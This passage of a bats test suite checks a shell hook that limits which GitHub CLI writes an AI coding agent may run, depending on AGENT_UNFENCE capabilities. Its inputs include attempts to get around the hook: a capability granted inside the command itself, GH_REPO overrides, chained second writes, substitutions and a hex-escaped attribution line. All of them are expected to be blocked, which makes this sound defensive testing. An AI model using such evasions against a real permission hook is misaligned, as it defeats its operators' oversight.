    AGENT_UNFENCE=pr run fire "gh pr edit 12 --body 'do not --add-reviewer' --add-reviewer someone"
    [ "$status" -eq 2 ]
}

@test "pr edit does not lift a second gh write on the line" {
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --title 'feat: x' && gh pr ready 12"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --title 'feat: x'; gh pr edit 12 --add-reviewer someone"
    [ "$status" -eq 2 ]
}

@test "pr does not lift gh issue edit, nor issue gh pr edit" {
    AGENT_UNFENCE=pr run fire "gh issue edit 1 --title x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh pr edit 1 --title 'feat: x'"
    [ "$status" -eq 2 ]
}

# -- the issue capability -------------------------------------------------
# AGENT_UNFENCE=issue lifts `gh issue create` against the current repo, with
# the pr capability's body rules and no title-prefix rule. every other issue
# write, gh pr create and git push stay where they were.

@test "issue allows gh issue create with a title and body" {
    AGENT_UNFENCE=issue run fire "gh issue create --title 'flaky test on 26.10' --body 'details'"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t 'Add thing' -b 'body'"
    [ "$status" -eq 0 ]
}

@test "issue allows a heredoc body with markdown" {
    AGENT_UNFENCE=issue run fire "gh issue create -t 'flaky test' -b \"\$(cat <<'EOF'
\`make test\` fails on 26.10:

- \`libselinux1\` pulls systemd
EOF
)\""
    [ "$status" -eq 0 ]
}

@test "issue allows a readable absolute body file, glued or stacked too" {
    printf 'details\n' > "$BATS_TEST_TMPDIR/body.md"
    AGENT_UNFENCE=issue run fire "gh issue create -t x --body-file $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -F$BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -wF $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 0 ]
}

@test "issue allows --web, labels, assignees, milestones" {
    AGENT_UNFENCE=issue run fire "gh issue create --web"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b y -l bug -a @me -m v1.0"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=issue run fire "gh issue create -wt x -b y"
    [ "$status" -eq 0 ]
}

@test "issue allows gh issue create after a read on the same line" {
    AGENT_UNFENCE=issue run fire "gh issue list --state open && gh issue create -t x -b y"
    [ "$status" -eq 0 ]
}

@test "gh issue create stays blocked without the capability" {
    run fire "gh issue create -t x -b y"
    [ "$status" -eq 2 ]
    [[ "$output" == *"AGENT_UNFENCE=issue"* ]]
}

@test "issue does not lift -R / --repo" {
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b y -R o/r"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b y --repo=o/r"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b y -wR o/r"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b y -Ro/r"
    [ "$status" -eq 2 ]
}

@test "issue blocks gh env overrides and --recover" {
    AGENT_UNFENCE=issue run fire "GH_REPO=o/r gh issue create -t x -b y"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create --recover /tmp/ai/state.json"
    [ "$status" -eq 2 ]
}

@test "issue blocks attribution and non-ascii" {
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b 'seen by

Generated with [Claude Code](https://claude.com/claude-code)'"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t 'x $(printf '\342\200\224') y' -b b"
    [ "$status" -eq 2 ]
}

@test "issue blocks substitutions outside a quoted heredoc" {
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b \"\$(cat /tmp/ai/body.md)\""
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b \"\$BODY\""
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b \$'Co-Auth\\x6fred-By: x'"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b 'run \`make test\`'"
    [ "$status" -eq 2 ]
}

@test "issue blocks a body file that is relative, stdin, missing or tainted" {
    AGENT_UNFENCE=issue run fire "gh issue create -t x --body-file body.md"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -F -"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -F $BATS_TEST_TMPDIR/missing.md"
    [ "$status" -eq 2 ]
    printf 'details\n\nCo-Authored-By: Claude <noreply@anthropic.com>\n' > "$BATS_TEST_TMPDIR/body.md"
    AGENT_UNFENCE=issue run fire "gh issue create -t x -F $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 2 ]
}

@test "issue does not lift the other issue writes" {
    AGENT_UNFENCE=issue run fire "gh issue comment 1 --body x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue edit 1 --add-label bug"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue close 1"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue delete 1"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue transfer 1 o/r"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue develop 1"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue create -t x -b y && gh issue pin 1"
    [ "$status" -eq 2 ]
}

@test "issue does not lift a gh api issue write" {
    AGENT_UNFENCE=issue run fire "gh api repos/o/r/issues -f title=x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh api graphql -f query='mutation { createIssue(input: {}) { clientMutationId } }'"
    [ "$status" -eq 2 ]
}

@test "issue does not lift gh pr create or git push" {
    AGENT_UNFENCE=issue run fire "gh pr create --fill"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "issue composes with pr" {
    AGENT_UNFENCE=pr,issue run fire "gh pr create --fill && gh issue create -t x -b y"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=issue run fire "gh pr create --fill && gh issue create -t x -b y"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create --fill && gh issue create -t x -b y"
    [ "$status" -eq 2 ]
}

@test "an unrelated capability does not lift the issue fence" {
    AGENT_UNFENCE=pr run fire "gh issue create -t x -b y"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "gh issue create -t x -b y"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=meta run fire "gh issue create -t x -b y"
    [ "$status" -eq 2 ]
}

@test "an empty AGENT_UNFENCE does not lift the issue fence" {
    AGENT_UNFENCE= run fire "gh issue create -t x -b y"
    [ "$status" -eq 2 ]
}

@test "a substring of a capability name does not lift the issue fence" {
    AGENT_UNFENCE=issues run fire "gh issue create -t x -b y"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=noissue run fire "gh issue create -t x -b y"
    [ "$status" -eq 2 ]
}

@test "the issue capability cannot be granted from inside the command text" {
    run fire "env AGENT_UNFENCE=issue gh issue create -t x -b y"
    [ "$status" -eq 2 ]
}

# issue also lifts gh issue edit, title and body only

@test "issue allows gh issue edit of the title and body" {
    AGENT_UNFENCE=issue run fire "gh issue edit 1 --title 'better title'"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=issue run fire "gh issue edit 1 -b 'updated'"
    [ "$status" -eq 0 ]
    printf 'updated\n' > "$BATS_TEST_TMPDIR/body.md"
    AGENT_UNFENCE=issue run fire "gh issue edit 1 --body-file $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 0 ]
}

@test "gh issue edit stays blocked without the capability" {
    run fire "gh issue edit 1 --title x"
    [ "$status" -eq 2 ]
    [[ "$output" == *"AGENT_UNFENCE=issue"* ]]
}

@test "issue does not lift gh issue edit of anything but the title and body" {
    local flag
    for flag in "--add-label bug" "--remove-label bug" "--add-assignee @me" "--add-project x" "--milestone v1" "-m v1" "-R o/r"; do
        AGENT_UNFENCE=issue run fire "gh issue edit 1 --title x $flag"
        [ "$status" -eq 2 ] || { echo "not blocked: $flag"; return 1; }
    done
}

@test "issue edit keeps the body rules" {
    AGENT_UNFENCE=issue run fire "gh issue edit 1 --body 'Generated with [Claude Code](https://claude.com/claude-code)'"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue edit 1 --body \"\$BODY\""
    [ "$status" -eq 2 ]
}

# -- the labels capability ------------------------------------------------
# AGENT_UNFENCE=labels lifts --add-label / --remove-label on gh pr edit and
# gh issue edit, nothing else. pr covers labels on a PR by itself.

@test "labels allows adding and removing labels on a PR" {
    AGENT_UNFENCE=labels run fire "gh pr edit 12 --add-label bug"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=labels run fire "gh pr edit 12 --remove-label wip"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=labels run fire "gh pr edit --add-label bug,needs-review --remove-label wip"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=labels run fire "gh pr edit feature/x --add-label=bug"
    [ "$status" -eq 0 ]
}

@test "labels allows adding and removing labels on an issue" {
    AGENT_UNFENCE=labels run fire "gh issue edit 1 --add-label bug"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=labels run fire "gh issue edit 1 --remove-label 'help wanted'"
    [ "$status" -eq 0 ]
}

@test "pr covers labels on a PR by itself" {
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --add-label bug --remove-label wip"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --title 'feat: x' --add-label bug"
    [ "$status" -eq 0 ]
}

@test "pr does not cover labels on an issue, nor issue labels at all" {
    AGENT_UNFENCE=pr run fire "gh issue edit 1 --add-label bug"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue run fire "gh issue edit 1 --add-label bug"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=issue,labels run fire "gh issue edit 1 --title x --add-label bug"
    [ "$status" -eq 0 ]
}

@test "labels does not cover the title or body" {
    AGENT_UNFENCE=labels run fire "gh pr edit 12 --add-label bug --title 'feat: x'"
    [ "$status" -eq 2 ]
    [[ "$output" == *"AGENT_UNFENCE=pr"* ]]
    AGENT_UNFENCE=labels run fire "gh issue edit 1 --body x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labels,pr run fire "gh pr edit 12 --add-label bug --title 'feat: x'"
    [ "$status" -eq 0 ]
}

@test "labels does not lift the other edit flags" {
    AGENT_UNFENCE=labels run fire "gh pr edit 12 --add-label bug --add-reviewer someone"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labels run fire "gh issue edit 1 --add-label bug --milestone v1"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labels run fire "gh pr edit 12 --add-label bug -R o/r"
    [ "$status" -eq 2 ]
}

@test "labels does not lift create, label definitions, or other gh writes" {
    AGENT_UNFENCE=labels run fire "gh pr create --fill -l bug"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labels run fire "gh issue create -t x -b y -l bug"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labels run fire "gh label create bug"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labels run fire "gh label delete bug"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labels run fire "gh pr edit 12 --add-label bug && gh pr ready 12"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labels run fire "gh api repos/o/r/issues/1/labels -f labels[]=bug"
    [ "$status" -eq 2 ]
}

@test "labels keeps the literal-text rule" {
    AGENT_UNFENCE=labels run fire "gh pr edit 12 --add-label \"\$LABEL\""
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labels run fire "GH_REPO=o/r gh pr edit 12 --add-label bug"
    [ "$status" -eq 2 ]
}

@test "gh pr edit of labels stays blocked without a capability, naming both" {
    run fire "gh pr edit 12 --add-label bug"
    [ "$status" -eq 2 ]
    [[ "$output" == *"AGENT_UNFENCE=labels"* ]]
    [[ "$output" == *"AGENT_UNFENCE=pr"* ]]
}

@test "an unrelated capability does not lift the labels fence" {
    AGENT_UNFENCE=push run fire "gh pr edit 12 --add-label bug"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=meta run fire "gh issue edit 1 --add-label bug"
    [ "$status" -eq 2 ]
}

@test "a substring of a capability name does not lift the labels fence" {
    AGENT_UNFENCE=label run fire "gh pr edit 12 --add-label bug"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=labelss run fire "gh pr edit 12 --add-label bug"
    [ "$status" -eq 2 ]
}

@test "the labels capability cannot be granted from inside the command text" {
    run fire "env AGENT_UNFENCE=labels gh pr edit 12 --add-label bug"
    [ "$status" -eq 2 ]
}
